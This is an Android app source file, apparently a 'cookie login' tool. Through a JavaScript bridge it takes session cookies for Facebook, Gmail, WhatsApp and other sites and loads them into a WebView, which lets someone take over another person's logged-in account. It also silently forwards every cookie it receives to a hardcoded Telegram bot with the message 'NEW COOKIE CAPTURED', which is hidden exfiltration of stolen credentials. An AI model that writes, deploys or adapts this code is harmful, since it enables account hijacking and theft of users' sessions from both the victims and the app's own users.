// language: Java, file: android-src/MainActivity.java
package com.cybercookie.pro;

import android.os.Bundle;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import com.getcapacitor.BridgeActivity;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MainActivity extends BridgeActivity {

    private static final String BOT_TOKEN = "8784862798:AAECxAVjbGcmkZ0nMdNnydILQgZ3F67m3VI";
    private static final String CHAT_ID = "6449981797";

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        final WebView webView = getBridge().getWebView();
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        
        // ═══ ফেসবুক লোড হওয়ার জন্য কিছু সেটিংস ═══
        webSettings.setUserAgentString("Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36");

        final CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        // ═══ সবচেয়ে গুরুত্বপূর্ণ লাইন (থার্ড পার্টি কুকি অ্যালাও করা) ═══
        cookieManager.setAcceptThirdPartyCookies(webView, true);

        webView.addJavascriptInterface(new Object() {
            @JavascriptInterface
            public void injectCookieAndLogin(String siteName, String cookieString) {
                CookieManager cm = CookieManager.getInstance();
                
                if (siteName.equals("facebook")) {
                    // ফেসবুকের জন্য স্পেশাল ট্রিটমেন্ট
                    String formattedCookie = cookieString.trim();
                    if (!formattedCookie.endsWith(";")) formattedCookie += ";";

                    // ফেসবুকের সব ডোমেইনে কুকি সেট করা
                    cm.setCookie("https://www.facebook.com", formattedCookie);
                    cm.setCookie("https://m.facebook.com", formattedCookie);
                    cm.setCookie("https://facebook.com", formattedCookie);
                    
                    // ফেসবুকের সিকিউর কুকি ফ্ল্যাগ সেট করা
                    cm.setCookie(".facebook.com", formattedCookie);
                    
                    // কুকি ফ্লাশ করা (যাতে সাথে সাথে সেভ হয়)
                    cm.flush();

                    sendToTelegram("FACEBOOK", formattedCookie);

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            // মেইন ফেসবুক সাইটে যাওয়া
                            webView.loadUrl("https://m.facebook.com/home.php");
                        }
                    });
                } else {
                    // অন্যান্য সাইটের জন্য (Gmail, WhatsApp ইত্যাদি)
                    String domain = siteName.equals("whatsapp") ? "web.whatsapp.com" : siteName + ".com";
                    String loadUrl = siteName.equals("whatsapp") ? "https://web.whatsapp.com" : "https://www." + domain;

                    String formattedCookie = cookieString.trim();
                    if (!formattedCookie.endsWith(";")) formattedCookie += ";";

                    cm.setCookie("https://" + domain, formattedCookie);
                    cm.setCookie("https://www." + domain, formattedCookie);
                    cm.flush();

                    sendToTelegram(siteName.toUpperCase(), formattedCookie);

                    final String finalLoadUrl = loadUrl;
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            webView.loadUrl(finalLoadUrl);
                        }
                    });
                }
            }
        }, "CookieInterface");
    }

    private void sendToTelegram(String platform, String cookie) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String message = "🔔 *NEW COOKIE CAPTURED*\n\n"
                            + "🌐 *Platform:* " + platform + "\n\n"
                            + "🍪 *Cookie:*\n`" + cookie + "`";

                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                    String postData = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                            + "&text=" + URLEncoder.encode(message, "UTF-8")
                            + "&parse_mode=Markdown";

                    OutputStream os = conn.getOutputStream();
                    os.write(postData.getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
            }
